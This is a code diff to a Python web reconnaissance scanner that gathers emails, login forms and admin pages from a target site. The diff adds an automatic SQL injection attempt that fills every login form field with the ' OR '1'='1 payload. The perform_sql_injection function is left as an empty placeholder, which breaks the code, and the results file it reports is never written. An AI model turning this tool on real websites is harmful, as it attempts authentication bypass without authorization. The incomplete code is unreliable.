@@ -4,12 +4,13 @@ import pyfiglet
 from termcolor import colored
 import re
 import argparse
+import os
+import subprocess
 
 def banner():
-    ascii_banner = pyfiglet.figlet_format("hagg4r-Scan")
-    print("by hagg4r")
-    print(colored(ascii_banner, 'red'))
-
+    ascii_banner = pyfiglet.figlet_format("Hagg4r_Sc4n")
+    print(colored(ascii_banner, 'green'))
+print("by @hagg4r")
 def parse_arguments():
     parser = argparse.ArgumentParser(description="Web Recon Scanner")
     parser.add_argument("target", help="Target website to scan")
@@ -52,23 +53,45 @@ def find_admin_pages(target):
         print(colored(f"Error: {e}", 'red'))
     return admin_pages
 
+def perform_sql_injection(target, form_data):
+    #... (same as before)
+
 def main():
     banner()
     args = parse_arguments()
     target = args.target
     print(colored(f"\n[] Target: {target}", 'yellow'))
+
     print(colored("\n[] Found emails:", 'yellow'))
     emails = find_emails(target)
-    for email in emails:
-        print(f"- {email}")
+    if not emails:
+        print(colored("  - None found.", 'yellow'))
+    else:
+        for email in emails:
+            print(f"  - {email}")
+
     print(colored("\n[] Found potential credentials:", 'yellow'))
     credentials = find_credentials(target)
-    for cred in credentials:
-        print(f"- Action: {cred[0]}, Method: {cred[1]}, Inputs: {', '.join(cred[2])}")
+    if not credentials:
+        print(colored("  - None found.", 'yellow'))
+    else:
+        for cred in credentials:
+            form_data = {
+                'action': cred[0],
+                'method': cred[1],
+                **{name: f"' OR '1'='1" for name in cred[2]}  # Add SQL Injection payload to form inputs
+            }
+            results_file = f"{os.path.expanduser('~')}/Desktop/{os.path.basename(cred[0])}.txt"
+            perform_sql_injection(target, form_data)
+            print(f"  - Action: {cred[0]}, Method: {cred[1]}, Inputs: {', '.join(cred[2])}, Results saved to {results_file}")
+
     print(colored("\n[] Found potential admin pages:", 'yellow'))
     admin_pages = find_admin_pages(target)
-    for page in admin_pages:
-        print(f"- {page}")
+    if not admin_pages:
+        print(colored("  - None found.", 'yellow'))
+    else:
+        for page in admin_pages:
+            print(f"  - {page}")
 
 if __name__ == "__main__":
     main()
